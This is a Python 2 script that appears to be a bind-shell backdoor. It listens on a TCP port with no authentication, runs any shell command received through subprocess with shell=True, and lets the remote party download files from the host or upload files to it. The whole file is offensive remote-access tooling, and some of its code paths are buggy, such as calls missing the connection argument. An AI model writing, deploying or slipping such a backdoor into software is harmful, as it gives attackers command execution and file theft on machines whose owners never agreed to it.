import socket
import threading
import struct
import shlex
import subprocess
import os
from optparse import OptionParser  
dl_file = ""
ul_file = ""
bind_ip = "0.0.0.0"
bind_port = 9999

def opt_parse():
    global dl_file
    global ul_file
    global bind_ip
    global bind_port
    try:
        opt_parm = OptionParser()
        opt_parm.add_option("-d","--download",dest="dl_file",\
                help="download file from the server",\
                type="string",default=dl_file)
        opt_parm.add_option("-u","--upload",dest="ul_file",\
                help="upload file from the server",\
                type="string",default=ul_file)
        opt_parm.add_option("-i","--ip",dest="ip",\
                help="set bind ip", type="string",default=bind_ip)
        opt_parm.add_option("-p","--port",dest="port",\
                help="set listen port",type="int",default=bind_port)
        (options, args) = opt_parm.parse_args()
        dl_file = options.dl_file
        ul_file = options.ul_file
        bind_ip = options.ip
        bind_port = options.port
    except Exception as e:
        print e


def cmd_parse(data):
    '''first byte is command type'''
    cmd_type = struct.unpack('B',data[0])[0]
    '''other bytes is command string'''
    cmd = data[1:]
    return cmd,cmd_type

def server_start(ip,port):
    '''start recv data with client'''
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((ip,port))
        server.listen(5)
        (conn,address) = server.accept()
    except Exception as e:
        print e
        return None,None
    return conn,address

def server_recv(conn):
    '''recv data with client'''
    try:
        data = conn.recv(4096)
        resp = data
        while len(data) == 4096:
            data = conn.recv(4096)
            resp += data
    except Exception as e:
        return None
    return resp


def server_send(client,data):
    try:
        client.send(data)
    except:
        pass
def run_command(cmd):
    try:
        result = subprocess.check_output(shlex.split(cmd),\
            stderr=subprocess.STDOUT, shell=True)
        if result == "":
            result = "\r"
    except subprocess.CalledProcessError as e:
        result = e.__str__()
    return result

def download_file(dl_filename,conn):
    try:
        buffsize = 1024
        fd = open(dl_filename,"rb")
        while True:
            data = fd.read(buffsize)
            conn.send(data)
            if len(data) != 1024:
                break
        fd.close()
    except Exception as e:
        '''send the error __str__()'''
        data = e.__str__()
        conn.send(data)
        return False
    return True

def upload_file(ul_filename,conn):
    try:
        conn.send(struct.pack("B",0x00))
        fd = open(os.path.basename(ul_filename),"wb")
        while True:
            data = conn.recv(1024)
            fd.write(data)
            if len(data) != 1024:
                break
        fd.close()
    except Exception as e:
        print e
        return False
    return True

def main():
    global dl_file
    global ul_file
    global bind_ip
    global bind_port
    opt_parse()
    if dl_file != "":
        download_file(dl_file)
        return 
    if ul_file != "":
        upload_file(ul_file)
        return
    
    while True:
        (conn,addr) = server_start(bind_ip,bind_port)
        if addr is None:
            bind_port -= 1
            continue
        print "[+] Connected by %s:%d" % (addr[0],addr[1])
        while True:
            if conn is None:
                break
            send_data = ""
            recv_data = server_recv(conn)
            if recv_data is None or recv_data == "":
                print "[-] Connection closed!"
                break
            (cmd,act_type) = cmd_parse(recv_data)
            if act_type == 0x00:
                '''do run command action'''
                send_data = run_command(cmd)
            elif act_type == 0x01:
                '''download file action'''
                if download_file(cmd,conn):
                    print "[+] download %s successed!" % cmd
                else:
                    print "[-] download %s failure!" % cmd
                send_data = "\r"
            elif act_type == 0x02:
                '''download file action'''
                if upload_file(cmd,conn):
                    print "[+] upload %s successed!" % cmd
                else:
                    print "[-] upload %s failure!" % cmd
                send_data = "\r"
            elif act_type == 0xff:
                print "[*] exited process.."
                exit(0)
            else:
                continue
            server_send(conn,send_data)
main()
